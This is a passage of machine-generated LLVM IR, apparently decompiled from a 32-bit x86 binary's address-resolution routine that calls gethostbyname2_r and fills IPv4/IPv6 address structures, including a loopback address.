  %v1_805d04a191 = phi i32 [ %v2_805d07c, %dec_label_pc_805d053 ], [ %v2_805d02c, %dec_label_pc_805d035 ]
  %v0_805d040190 = phi i32 [ %v1_805d07e, %dec_label_pc_805d053 ], [ %v1_805cfeb, %dec_label_pc_805d035 ]
  %v1_805d03b = inttoptr i32 %v1_805d04a191 to i32*
  %v2_805d03b = load i32, i32* %v1_805d03b, align 4
  %v3_805d03b = icmp eq i32 %v2_805d03b, 0
  %v1_805d03e = icmp eq i1 %v3_805d03b, false
  br i1 %v1_805d03e, label %dec_label_pc_805d053, label %dec_label_pc_805d040

dec_label_pc_805d040:                             ; preds = %dec_label_pc_805d03b
  %v1_805d043 = add i32 %v0_805d040190, -33
  %v1_805d047 = and i32 %v1_805d043, -16
  store i32 %v1_805d047, i32* %eax.global-to-local, align 4
  store i32 %v1_805d047, i32* %v1_805d03b, align 4
  %v0_805d04c = load i32, i32* %eax.global-to-local, align 4
  %v1_805d04c = add i32 %v0_805d04c, 24
  %v2_805d04c = inttoptr i32 %v1_805d04c to i32*
  store i32 0, i32* %v2_805d04c, align 4
  %v0_805d053.pre = load i32, i32* @edi, align 4
  %v1_805d053.phi.trans.insert = inttoptr i32 %v0_805d053.pre to i32*
  %v2_805d053.pre = load i32, i32* %v1_805d053.phi.trans.insert, align 4
  %v0_805d055.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805d053

dec_label_pc_805d053:                             ; preds = %dec_label_pc_805d03b, %dec_label_pc_805d040
  %v0_805d055 = phi i32 [ %v0_805d084192, %dec_label_pc_805d03b ], [ %v0_805d055.pre, %dec_label_pc_805d040 ]
  %v2_805d053 = phi i32 [ %v2_805d03b, %dec_label_pc_805d03b ], [ %v2_805d053.pre, %dec_label_pc_805d040 ]
  store i32 %v2_805d053, i32* %eax.global-to-local, align 4
  %v1_805d055 = add i32 %v0_805d055, 1
  store i32 %v1_805d055, i32* %ebx.global-to-local, align 4
  %v1_805d056 = inttoptr i32 %v2_805d053 to i32*
  store i32 0, i32* %v1_805d056, align 4
  %v0_805d05c = load i32, i32* @edi, align 4
  %v1_805d05c = inttoptr i32 %v0_805d05c to i32*
  %v2_805d05c = load i32, i32* %v1_805d05c, align 4
  store i32 %v2_805d05c, i32* %eax.global-to-local, align 4
  %v1_805d05e = add i32 %v2_805d05c, 4
  %v2_805d05e = inttoptr i32 %v1_805d05e to i32*
  store i32 10, i32* %v2_805d05e, align 4
  %v0_805d065 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d065 = load i32, i32* @esp, align 4
  %v2_805d065 = add i32 %v1_805d065, -4
  %v3_805d065 = inttoptr i32 %v2_805d065 to i32*
  store i32 %v0_805d065, i32* %v3_805d065, align 4
  %v3_805d066 = load i8*, i8** %stack_var_-32, align 4
  %v4_805d066 = ptrtoint i8* %v3_805d066 to i32
  store i32 %v4_805d066, i32* %eax.global-to-local, align 4
  %v1_805d069 = add i32 %v1_805d065, -8
  %v2_805d069 = inttoptr i32 %v1_805d069 to i32*
  store i32 16, i32* %v2_805d069, align 4
  %v0_805d06b = load i32, i32* %eax.global-to-local, align 4
  %v1_805d06b = add i32 %v0_805d06b, 16
  %v2_805d06b = inttoptr i32 %v1_805d06b to i32*
  %v3_805d06b = load i32, i32* %v2_805d06b, align 4
  store i32 %v3_805d06b, i32* %eax.global-to-local, align 4
  %v1_805d06e = load i32, i32* %edx.global-to-local, align 4
  %v2_805d06e = add i32 %v1_805d06e, %v3_805d06b
  %v3_805d06e = inttoptr i32 %v2_805d06e to i32*
  %v4_805d06e = load i32, i32* %v3_805d06e, align 4
  %v6_805d06e = add i32 %v1_805d065, -12
  %v7_805d06e = inttoptr i32 %v6_805d06e to i32*
  store i32 %v4_805d06e, i32* %v7_805d06e, align 4
  %v0_805d071 = load i32, i32* @edi, align 4
  %v1_805d071 = inttoptr i32 %v0_805d071 to i32*
  %v2_805d071 = load i32, i32* %v1_805d071, align 4
  %v1_805d073 = add i32 %v2_805d071, 8
  store i32 %v1_805d073, i32* %eax.global-to-local, align 4
  %v2_805d076 = add i32 %v1_805d065, -16
  %v3_805d076 = inttoptr i32 %v2_805d076 to i32*
  store i32 %v1_805d073, i32* %v3_805d076, align 4
  %v0_805d077 = load i8*, i8** %stack_var_-252, align 4
  %tmp160 = bitcast i8* %v0_805d077 to i16*
  %v5_805d077 = call i32 @memcpy(i16* %tmp160, i32 %v4_805ce68, i32 %v1_805ce64)
  store i32 %v5_805d077, i32* %eax.global-to-local, align 4
  %v0_805d07c = load i32, i32* @edi, align 4
  %v1_805d07c = inttoptr i32 %v0_805d07c to i32*
  %v2_805d07c = load i32, i32* %v1_805d07c, align 4
  store i32 %v2_805d07c, i32* @edi, align 4
  %v0_805d07e = load i32, i32* @esp, align 4
  %v1_805d07e = add i32 %v0_805d07e, 16
  %v3_805d081.pre = load i8*, i8** %stack_var_-32, align 4
  %v0_805d084.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805d081 = ptrtoint i8* %v3_805d081.pre to i32
  store i32 %v4_805d081, i32* %eax.global-to-local, align 4
  %v1_805d084 = mul i32 %v0_805d084.pre, 4
  store i32 %v1_805d084, i32* %edx.global-to-local, align 4
  %v1_805d08b = add i32 %v4_805d081, 16
  %v2_805d08b = inttoptr i32 %v1_805d08b to i32*
  %v3_805d08b = load i32, i32* %v2_805d08b, align 4
  store i32 %v3_805d08b, i32* %eax.global-to-local, align 4
  %v2_805d08e = add i32 %v3_805d08b, %v1_805d084
  %v3_805d08e = inttoptr i32 %v2_805d08e to i32*
  %v4_805d08e = load i32, i32* %v3_805d08e, align 4
  %v5_805d08e = icmp eq i32 %v4_805d08e, 0
  %v1_805d092 = icmp eq i1 %v5_805d08e, false
  br i1 %v1_805d092, label %dec_label_pc_805d03b, label %dec_label_pc_805d094

dec_label_pc_805d094:                             ; preds = %dec_label_pc_805d035, %dec_label_pc_805d053, %dec_label_pc_805d028, %dec_label_pc_805cfb4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805d096

dec_label_pc_805d096:                             ; preds = %dec_label_pc_805d01c, %dec_label_pc_805d013, %dec_label_pc_805d094
  %v0_805d191 = phi i32 [ %v1_805d023, %dec_label_pc_805d01c ], [ -3, %dec_label_pc_805d013 ], [ 0, %dec_label_pc_805d094 ]
  store i32 %arg3, i32* @ecx, align 4
  %v3_805d099 = load i32, i32* %v2_805cbce, align 4
  store i32 %v3_805d099, i32* %eax.global-to-local, align 4
  %v9_805d09c = icmp eq i32 %v3_805d099, 2
  br i1 %v9_805d09c, label %dec_label_pc_805d0b7, label %dec_label_pc_805d0a1

dec_label_pc_805d0a1:                             ; preds = %dec_label_pc_805d096
  %v3_805d0a1 = load i32, i32* %stack_var_-156, align 4
  %v4_805d0a1 = icmp eq i32 %v3_805d0a1, 0
  %v1_805d0a8 = icmp eq i1 %v4_805d0a1, false
  br i1 %v1_805d0a8, label %dec_label_pc_805d0b3, label %dec_label_pc_805d0aa

dec_label_pc_805d0aa:                             ; preds = %dec_label_pc_805d0a1
  %v1_805d0aa = icmp eq i32 %v3_805d099, 0
  br i1 %v1_805d0aa, label %dec_label_pc_805d0b7, label %dec_label_pc_805d193

dec_label_pc_805d0b3:                             ; preds = %dec_label_pc_805d0a1
  %v1_805d0b3 = icmp eq i32 %v0_805d191, 0
  br i1 %v1_805d0b3, label %dec_label_pc_805d0be, label %dec_label_pc_805d0b7

dec_label_pc_805d0b7:                             ; preds = %dec_label_pc_805d0be, %dec_label_pc_805d0b3, %dec_label_pc_805d0aa, %dec_label_pc_805d096
  %v2_805d0da = ptrtoint i32* %stack_var_-28 to i32
  %v2_805d0e1 = ptrtoint i8** %stack_var_-32 to i32
  %v2_805d0e5 = ptrtoint i32* %stack_var_-68 to i32
  %v0_805d0d3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805d0cb

dec_label_pc_805d0be:                             ; preds = %dec_label_pc_805d0b3
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805d0c1 = load i8, i8* %tmp118, align 1
  %v3_805d0c1 = and i8 %v2_805d0c1, 16
  %v4_805d0c1 = icmp eq i8 %v3_805d0c1, 0
  %v1_805d0c4 = icmp eq i1 %v4_805d0c1, false
  br i1 %v1_805d0c4, label %dec_label_pc_805d0b7, label %dec_label_pc_805d193.thread

dec_label_pc_805d193.thread:                      ; preds = %dec_label_pc_805d0be
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d1b8

dec_label_pc_805d0cb:                             ; preds = %dec_label_pc_805d0fd.dec_label_pc_805d0cb_crit_edge, %dec_label_pc_805d0b7
  %v0_805d0d3 = phi i32 [ %v1_805d0f5, %dec_label_pc_805d0fd.dec_label_pc_805d0cb_crit_edge ], [ %v0_805d0d3.pre, %dec_label_pc_805d0b7 ]
  %v0_805d0cb = phi i32 [ %v0_805d0cb.pre, %dec_label_pc_805d0fd.dec_label_pc_805d0cb_crit_edge ], [ 512, %dec_label_pc_805d0b7 ]
  %v2_805d0cb = mul i32 %v0_805d0cb, 2
  store i32 %v2_805d0cb, i32* @esi, align 4
  %v1_805d0cd = add i32 %v2_805d0cb, 30
  %v1_805d0d0 = and i32 %v1_805d0cd, -16
  %v2_805d0d3 = sub i32 %v0_805d0d3, %v1_805d0d0
  %v1_805d0d5 = add i32 %v2_805d0d3, 15
  store i32 %v1_805d0d5, i32* %edx.global-to-local, align 4
  %v2_805d0d9 = add i32 %v2_805d0d3, -4
  %v3_805d0d9 = inttoptr i32 %v2_805d0d9 to i32*
  store i32 %v1_805d0d0, i32* %v3_805d0d9, align 4
  %v0_805d0dd = load i32, i32* %edx.global-to-local, align 4
  %v1_805d0dd = and i32 %v0_805d0dd, -16
  store i32 %v1_805d0dd, i32* %edx.global-to-local, align 4
  %v2_805d0e0 = add i32 %v2_805d0d3, -8
  %v3_805d0e0 = inttoptr i32 %v2_805d0e0 to i32*
  store i32 %v2_805d0da, i32* %v3_805d0e0, align 4
  %v2_805d0e4 = add i32 %v2_805d0d3, -12
  %v3_805d0e4 = inttoptr i32 %v2_805d0e4 to i32*
  store i32 %v2_805d0e1, i32* %v3_805d0e4, align 4
  store i32 %v2_805d0e5, i32* %eax.global-to-local, align 4
  %v0_805d0e8 = load i32, i32* @esi, align 4
  %v2_805d0e8 = add i32 %v2_805d0d3, -16
  %v3_805d0e8 = inttoptr i32 %v2_805d0e8 to i32*
  store i32 %v0_805d0e8, i32* %v3_805d0e8, align 4
  %v0_805d0e9 = load i32, i32* %edx.global-to-local, align 4
  %v2_805d0e9 = add i32 %v2_805d0d3, -20
  %v3_805d0e9 = inttoptr i32 %v2_805d0e9 to i32*
  store i32 %v0_805d0e9, i32* %v3_805d0e9, align 4
  %v2_805d0ea = add i32 %v2_805d0d3, -24
  %v3_805d0ea = inttoptr i32 %v2_805d0ea to i32*
  store i32 %v2_805d0e5, i32* %v3_805d0ea, align 4
  %v1_805d0eb = add i32 %v2_805d0d3, -28
  %v2_805d0eb = inttoptr i32 %v1_805d0eb to i32*
  store i32 2, i32* %v2_805d0eb, align 4
  %v3_805d0ed = load i8*, i8** %stack_var_4, align 4
  %v4_805d0ed = ptrtoint i8* %v3_805d0ed to i32
  %v6_805d0ed = add i32 %v2_805d0d3, -32
  %v7_805d0ed = inttoptr i32 %v6_805d0ed to i32*
  store i32 %v4_805d0ed, i32* %v7_805d0ed, align 4
  %v0_805d0f0 = call i32 @gethostbyname2_r()
  store i32 %v0_805d0f0, i32* %eax.global-to-local, align 4
  %v0_805d0f5 = load i32, i32* @esp, align 4
  %v1_805d0f5 = add i32 %v0_805d0f5, 32
  %v9_805d0f8 = icmp eq i32 %v0_805d0f0, 34
  %v1_805d0fb = icmp eq i1 %v9_805d0f8, false
  br i1 %v1_805d0fb, label %dec_label_pc_805d105, label %dec_label_pc_805d0fd

dec_label_pc_805d0fd:                             ; preds = %dec_label_pc_805d0cb
  %v3_805d0fd = load i32, i32* %stack_var_-28, align 4
  %v13_805d0fd = icmp eq i32 %v3_805d0fd, -1
  br i1 %v13_805d0fd, label %dec_label_pc_805d0fd.dec_label_pc_805d0cb_crit_edge, label %dec_label_pc_805d109

dec_label_pc_805d0fd.dec_label_pc_805d0cb_crit_edge: ; preds = %dec_label_pc_805d0fd
  %v0_805d0cb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d0cb

dec_label_pc_805d105:                             ; preds = %dec_label_pc_805d0cb
  %v1_805d105 = icmp eq i32 %v0_805d0f0, 0
  br i1 %v1_805d105, label %dec_label_pc_805d129, label %dec_label_pc_805d105.dec_label_pc_805d109_crit_edge

dec_label_pc_805d105.dec_label_pc_805d109_crit_edge: ; preds = %dec_label_pc_805d105
  %v3_805d109.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805d109

dec_label_pc_805d109:                             ; preds = %dec_label_pc_805d0fd, %dec_label_pc_805d105.dec_label_pc_805d109_crit_edge
  %v0_805d121 = phi i32 [ %v3_805d109.pre, %dec_label_pc_805d105.dec_label_pc_805d109_crit_edge ], [ %v3_805d0fd, %dec_label_pc_805d0fd ]
  store i32 %v0_805d121, i32* %edx.global-to-local, align 4
  %v10_805d10c = icmp eq i32 %v0_805d121, -1
  br i1 %v10_805d10c, label %dec_label_pc_805d51b, label %dec_label_pc_805d115

dec_label_pc_805d115:                             ; preds = %dec_label_pc_805d109
  store i32 -3, i32* %eax.global-to-local, align 4
  %v9_805d11a = icmp eq i32 %v0_805d121, 2
  br i1 %v9_805d11a, label %dec_label_pc_805d197, label %dec_label_pc_805d11f

dec_label_pc_805d11f:                             ; preds = %dec_label_pc_805d115
  store i32 0, i32* %eax.global-to-local, align 4
  %v9_805d121 = icmp eq i32 %v0_805d121, 4
  %v1_805d124 = zext i1 %v9_805d121 to i32
  br label %dec_label_pc_805d193

dec_label_pc_805d129:                             ; preds = %dec_label_pc_805d105
  store i32 0, i32* @ebx, align 4
  %v3_805d12b = load i8*, i8** %stack_var_-32, align 4
  %v5_805d12b = icmp eq i8* %v3_805d12b, null
  %v1_805d12f = icmp eq i1 %v5_805d12b, false
  br i1 %v1_805d12f, label %dec_label_pc_805d17c.preheader, label %dec_label_pc_805d1b8

dec_label_pc_805d17c.preheader:                   ; preds = %dec_label_pc_805d129
  %v4_805d17c172 = ptrtoint i8* %v3_805d12b to i32
  store i32 %v4_805d17c172, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805d186173 = add i32 %v4_805d17c172, 16
  %v2_805d186174 = inttoptr i32 %v1_805d186173 to i32*
  %v3_805d186175 = load i32, i32* %v2_805d186174, align 4
  store i32 %v3_805d186175, i32* %eax.global-to-local, align 4
  %v3_805d189176 = inttoptr i32 %v3_805d186175 to i32*
  %v4_805d189177 = load i32, i32* %v3_805d189176, align 4
  %v5_805d189178 = icmp eq i32 %v4_805d189177, 0
  %v1_805d18d179 = icmp eq i1 %v5_805d189178, false
  br i1 %v1_805d18d179, label %dec_label_pc_805d136.lr.ph, label %dec_label_pc_805d1b8

dec_label_pc_805d136.lr.ph:                       ; preds = %dec_label_pc_805d17c.preheader
  %v0_805d136.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d136

dec_label_pc_805d136:                             ; preds = %dec_label_pc_805d136.lr.ph, %dec_label_pc_805d14e
  %v0_805d136 = phi i32 [ %v0_805d136.pre, %dec_label_pc_805d136.lr.ph ], [ %v2_805d177, %dec_label_pc_805d14e ]
  %v0_805d17f181 = phi i32 [ 0, %dec_label_pc_805d136.lr.ph ], [ %v0_805d17f.pre, %dec_label_pc_805d14e ]
  %v0_805d13b180 = phi i32 [ %v1_805d0f5, %dec_label_pc_805d136.lr.ph ], [ %v1_805d179, %dec_label_pc_805d14e ]
  %v1_805d136 = inttoptr i32 %v0_805d136 to i32*
  %v2_805d136 = load i32, i32* %v1_805d136, align 4
  %v3_805d136 = icmp eq i32 %v2_805d136, 0
  %v1_805d139 = icmp eq i1 %v3_805d136, false
  br i1 %v1_805d139, label %dec_label_pc_805d14e, label %dec_label_pc_805d13b

dec_label_pc_805d13b:                             ; preds = %dec_label_pc_805d136
  %v1_805d13e = add i32 %v0_805d13b180, -33
  %v1_805d142 = and i32 %v1_805d13e, -16
  store i32 %v1_805d142, i32* %eax.global-to-local, align 4
  store i32 %v1_805d142, i32* %v1_805d136, align 4
  %v0_805d147 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d147 = add i32 %v0_805d147, 24
  %v2_805d147 = inttoptr i32 %v1_805d147 to i32*
  store i32 0, i32* %v2_805d147, align 4
  %v0_805d14e.pre = load i32, i32* @edi, align 4
  %v1_805d14e.phi.trans.insert = inttoptr i32 %v0_805d14e.pre to i32*
  %v2_805d14e.pre = load i32, i32* %v1_805d14e.phi.trans.insert, align 4
  %v0_805d150.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d14e

dec_label_pc_805d14e:                             ; preds = %dec_label_pc_805d136, %dec_label_pc_805d13b
  %v0_805d150 = phi i32 [ %v0_805d17f181, %dec_label_pc_805d136 ], [ %v0_805d150.pre, %dec_label_pc_805d13b ]
  %v2_805d14e = phi i32 [ %v2_805d136, %dec_label_pc_805d136 ], [ %v2_805d14e.pre, %dec_label_pc_805d13b ]
  store i32 %v2_805d14e, i32* %eax.global-to-local, align 4
  %v1_805d150 = add i32 %v0_805d150, 1
  store i32 %v1_805d150, i32* @ebx, align 4
  %v1_805d151 = inttoptr i32 %v2_805d14e to i32*
  store i32 0, i32* %v1_805d151, align 4
  %v0_805d157 = load i32, i32* @edi, align 4
  %v1_805d157 = inttoptr i32 %v0_805d157 to i32*
  %v2_805d157 = load i32, i32* %v1_805d157, align 4
  store i32 %v2_805d157, i32* %eax.global-to-local, align 4
  %v1_805d159 = add i32 %v2_805d157, 4
  %v2_805d159 = inttoptr i32 %v1_805d159 to i32*
  store i32 2, i32* %v2_805d159, align 4
  %v0_805d160 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d160 = load i32, i32* @esp, align 4
  %v2_805d160 = add i32 %v1_805d160, -4
  %v3_805d160 = inttoptr i32 %v2_805d160 to i32*
  store i32 %v0_805d160, i32* %v3_805d160, align 4
  %v3_805d161 = load i8*, i8** %stack_var_-32, align 4
  %v4_805d161 = ptrtoint i8* %v3_805d161 to i32
  store i32 %v4_805d161, i32* %eax.global-to-local, align 4
  %v1_805d164 = add i32 %v1_805d160, -8
  %v2_805d164 = inttoptr i32 %v1_805d164 to i32*
  store i32 4, i32* %v2_805d164, align 4
  %v0_805d166 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d166 = add i32 %v0_805d166, 16
  %v2_805d166 = inttoptr i32 %v1_805d166 to i32*
  %v3_805d166 = load i32, i32* %v2_805d166, align 4
  store i32 %v3_805d166, i32* %eax.global-to-local, align 4
  %v1_805d169 = load i32, i32* %edx.global-to-local, align 4
  %v2_805d169 = add i32 %v1_805d169, %v3_805d166
  %v3_805d169 = inttoptr i32 %v2_805d169 to i32*
  %v4_805d169 = load i32, i32* %v3_805d169, align 4
  %v6_805d169 = add i32 %v1_805d160, -12
  %v7_805d169 = inttoptr i32 %v6_805d169 to i32*
  store i32 %v4_805d169, i32* %v7_805d169, align 4
  %v0_805d16c = load i32, i32* @edi, align 4
  %v1_805d16c = inttoptr i32 %v0_805d16c to i32*
  %v2_805d16c = load i32, i32* %v1_805d16c, align 4
  %v1_805d16e = add i32 %v2_805d16c, 8
  store i32 %v1_805d16e, i32* %eax.global-to-local, align 4
  %v2_805d171 = add i32 %v1_805d160, -16
  %v3_805d171 = inttoptr i32 %v2_805d171 to i32*
  store i32 %v1_805d16e, i32* %v3_805d171, align 4
  %v0_805d172 = load i8*, i8** %stack_var_-252, align 4
  %tmp161 = bitcast i8* %v0_805d172 to i16*
  %v5_805d172 = call i32 @memcpy(i16* %tmp161, i32 %v4_805ce68, i32 %v1_805ce64)
  store i32 %v5_805d172, i32* %eax.global-to-local, align 4
  %v0_805d177 = load i32, i32* @edi, align 4
  %v1_805d177 = inttoptr i32 %v0_805d177 to i32*
  %v2_805d177 = load i32, i32* %v1_805d177, align 4
  store i32 %v2_805d177, i32* @edi, align 4
  %v0_805d179 = load i32, i32* @esp, align 4
  %v1_805d179 = add i32 %v0_805d179, 16
  %v3_805d17c.pre = load i8*, i8** %stack_var_-32, align 4
  %v0_805d17f.pre = load i32, i32* @ebx, align 4
  %v4_805d17c = ptrtoint i8* %v3_805d17c.pre to i32
  store i32 %v4_805d17c, i32* %eax.global-to-local, align 4
  %v1_805d17f = mul i32 %v0_805d17f.pre, 4
  store i32 %v1_805d17f, i32* %edx.global-to-local, align 4
  %v1_805d186 = add i32 %v4_805d17c, 16
  %v2_805d186 = inttoptr i32 %v1_805d186 to i32*
  %v3_805d186 = load i32, i32* %v2_805d186, align 4
  store i32 %v3_805d186, i32* %eax.global-to-local, align 4
  %v2_805d189 = add i32 %v3_805d186, %v1_805d17f
  %v3_805d189 = inttoptr i32 %v2_805d189 to i32*
  %v4_805d189 = load i32, i32* %v3_805d189, align 4
  %v5_805d189 = icmp eq i32 %v4_805d189, 0
  %v1_805d18d = icmp eq i1 %v5_805d189, false
  br i1 %v1_805d18d, label %dec_label_pc_805d136, label %dec_label_pc_805d1b8

dec_label_pc_805d193:                             ; preds = %dec_label_pc_805d0aa, %dec_label_pc_805d11f
  %storemerge7 = phi i32 [ %v1_805d124, %dec_label_pc_805d11f ], [ %v0_805d191, %dec_label_pc_805d0aa ]
  store i32 %storemerge7, i32* %eax.global-to-local, align 4
  %v1_805d193 = icmp eq i32 %storemerge7, 0
  br i1 %v1_805d193, label %dec_label_pc_805d1b8, label %dec_label_pc_805d197

dec_label_pc_805d197:                             ; preds = %dec_label_pc_805d193, %dec_label_pc_805d115
  %v0_805d19b = phi i32 [ %storemerge7, %dec_label_pc_805d193 ], [ -3, %dec_label_pc_805d115 ]
  %v0_805d197 = load i32, i32* @ebx, align 4
  %v1_805d197 = icmp eq i32 %v0_805d197, 0
  br i1 %v1_805d197, label %dec_label_pc_805d1b8, label %dec_label_pc_805d19b

dec_label_pc_805d19b:                             ; preds = %dec_label_pc_805d197
  %v10_805d19b = icmp eq i32 %v0_805d19b, -3
  %v1_805d19e = icmp eq i1 %v10_805d19b, false
  br i1 %v1_805d19e, label %dec_label_pc_805d1ae, label %dec_label_pc_805d1a0

dec_label_pc_805d1a0:                             ; preds = %dec_label_pc_805d19b
  store i32 3, i32* %eax.global-to-local, align 4
  %v10_805d1a5 = icmp eq i32 %v0_805d197, -3
  br i1 %v10_805d1a5, label %dec_label_pc_805d536, label %dec_label_pc_805d1ae

dec_label_pc_805d1ae:                             ; preds = %dec_label_pc_805d1a0, %dec_label_pc_805d19b
  store i32 259, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d536

dec_label_pc_805d1b8:                             ; preds = %dec_label_pc_805d17c.preheader, %dec_label_pc_805d14e, %dec_label_pc_805d193.thread, %dec_label_pc_805d129, %dec_label_pc_805d197, %dec_label_pc_805d193, %dec_label_pc_805cf9c, %dec_label_pc_805cf8f
  %v3_805d1b8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d1b8, i32* %eax.global-to-local, align 4
  %v1_805d1bb = add i32 %v3_805d1b8, 4
  %v2_805d1bb = inttoptr i32 %v1_805d1bb to i32*
  %v3_805d1bb = load i32, i32* %v2_805d1bb, align 4
  %v4_805d1bb = icmp eq i32 %v3_805d1bb, 0
  %v1_805d1bf = icmp eq i1 %v4_805d1bb, false
  br i1 %v1_805d1bf, label %dec_label_pc_805d273, label %dec_label_pc_805d514

dec_label_pc_805d1ca:                             ; preds = %dec_label_pc_805ce2f
  %v8_805d1d2 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v8_805d1d2, i32* %eax.global-to-local, align 4
  store i32 %v8_805d1d2, i32* %stack_var_-24, align 4
  store i32 %v8_805d1d2, i32* @ebx, align 4
  %tmp162 = bitcast i32* %stack_var_-224 to i8*
  store i8* %tmp162, i8** %stack_var_-252, align 4
  %v5_805d1df = call i32 @__GI_memset(i8* %tmp162, i32 0, i32 28)
  store i32 %v5_805d1df, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805d1ea = load i32, i32* %v2_805cbce, align 4
  %v4_805d1ea = icmp eq i32 %v3_805d1ea, 0
  %v1_805d1ee = icmp eq i1 %v4_805d1ea, false
  br i1 %v1_805d1ee, label %dec_label_pc_805d211, label %dec_label_pc_805d1f0

dec_label_pc_805d1f0:                             ; preds = %dec_label_pc_805d1ca
  %v3_805d1f3 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d1f3, i32* %edx.global-to-local, align 4
  %v8_805d1fa = ptrtoint i32* %stack_var_-272 to i32
  %v2_805d1fd = inttoptr i32 %v3_805d1f3 to i32*
  store i32 %v8_805d1fa, i32* %v2_805d1fd, align 4
  %v3_805d200 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d200, i32* %eax.global-to-local, align 4
  %v1_805d207 = inttoptr i32 %v3_805d200 to i32*
  %v2_805d207 = load i32, i32* %v1_805d207, align 4
  %v3_805d209 = inttoptr i32 %v2_805d207 to i8*
  %v4_805d209 = call i32 @__GI_memset(i8* %v3_805d209, i32 0, i32 28)
  store i32 %v4_805d209, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d211

dec_label_pc_805d211:                             ; preds = %dec_label_pc_805d1ca, %dec_label_pc_805d1f0
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v3_805d214 = load i32, i32* %v2_805cbce, align 4
  store i32 %v3_805d214, i32* %eax.global-to-local, align 4
  %v1_805d217 = icmp eq i32 %v3_805d214, 0
  br i1 %v1_805d217, label %dec_label_pc_805d220, label %dec_label_pc_805d21b

dec_label_pc_805d21b:                             ; preds = %dec_label_pc_805d211
  %v9_805d21b = icmp eq i32 %v3_805d214, 10
  %v1_805d21e = icmp eq i1 %v9_805d21b, false
  br i1 %v1_805d21e, label %dec_label_pc_805d24e, label %dec_label_pc_805d220

dec_label_pc_805d220:                             ; preds = %dec_label_pc_805d21b, %dec_label_pc_805d211
  %v3_805d220 = load i32, i32* %stack_var_-24, align 4
  %v1_805d223 = add i32 %v3_805d220, 4
  %v2_805d223 = inttoptr i32 %v1_805d223 to i32*
  store i32 10, i32* %v2_805d223, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805d22d = load i8, i8* %tmp118, align 1
  %v3_805d22d = urem i8 %v2_805d22d, 2
  %v4_805d22d = icmp eq i8 %v3_805d22d, 0
  %v1_805d230 = icmp eq i1 %v4_805d22d, false
  br i1 %v1_805d230, label %dec_label_pc_805d249, label %dec_label_pc_805d232

dec_label_pc_805d232:                             ; preds = %dec_label_pc_805d220
  %v3_805d232 = load i32, i32* %stack_var_-24, align 4
  %v1_805d236 = add i32 %v3_805d232, 8
  store i32 %v1_805d236, i32* %eax.global-to-local, align 4
  %v5_805d240 = inttoptr i32 %v1_805d236 to i8*
  store i8* %v5_805d240, i8** %stack_var_-252, align 4
  %tmp163 = inttoptr i32 %v1_805d236 to i16*
  %v5_805d241 = call i32 @memcpy(i16* %tmp163, i32 ptrtoint (i32* @global_var_806dab8.753 to i32), i32 16)
  store i32 %v5_805d241, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d249

dec_label_pc_805d249:                             ; preds = %dec_label_pc_805d220, %dec_label_pc_805d232
  %v3_805d249 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d249, i32* %eax.global-to-local, align 4
  %v1_805d24c = inttoptr i32 %v3_805d249 to i32*
  %v2_805d24c = load i32, i32* %v1_805d24c, align 4
  store i32 %v2_805d24c, i32* @ebx, align 4
  br label %dec_label_pc_805d24e

dec_label_pc_805d24e:                             ; preds = %dec_label_pc_805d21b, %dec_label_pc_805d249
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805d251 = load i32, i32* %v2_805cbce, align 4
  store i32 %v3_805d251, i32* %eax.global-to-local, align 4
  %v1_805d254 = icmp eq i32 %v3_805d251, 0
  br i1 %v1_805d254, label %dec_label_pc_805d25d, label %dec_label_pc_805d258

dec_label_pc_805d258:                             ; preds = %dec_label_pc_805d24e
  %v9_805d258 = icmp eq i32 %v3_805d251, 2
  %v1_805d25b = icmp eq i1 %v9_805d258, false
  br i1 %v1_805d25b, label %dec_label_pc_805d273, label %dec_label_pc_805d25d

dec_label_pc_805d25d:                             ; preds = %dec_label_pc_805d258, %dec_label_pc_805d24e
  %v0_805d25d = load i32, i32* @ebx, align 4
  %v1_805d25d = add i32 %v0_805d25d, 4
  %v2_805d25d = inttoptr i32 %v1_805d25d to i32*
  store i32 2, i32* %v2_805d25d, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_805d267 = load i8, i8* %tmp118, align 1
  %v3_805d267 = urem i8 %v2_805d267, 2
  %v4_805d267 = icmp eq i8 %v3_805d267, 0
  %v1_805d26a = icmp eq i1 %v4_805d267, false
  br i1 %v1_805d26a, label %dec_label_pc_805d273, label %dec_label_pc_805d26c

dec_label_pc_805d26c:                             ; preds = %dec_label_pc_805d25d
  %v0_805d26c = load i32, i32* @ebx, align 4
  %v1_805d26c = add i32 %v0_805d26c, 8
  %v2_805d26c = inttoptr i32 %v1_805d26c to i32*
  store i32 16777343, i32* %v2_805d26c, align 4
  br label %dec_label_pc_805d273

dec_label_pc_805d273:                             ; preds = %dec_label_pc_805d25d, %dec_label_pc_805d258, %dec_label_pc_805d1b8, %dec_label_pc_805d26c
  %v4_805d273 = icmp eq i32 %arg4, 0
  br i1 %v4_805d273, label %dec_label_pc_805d534, label %dec_label_pc_805d27d

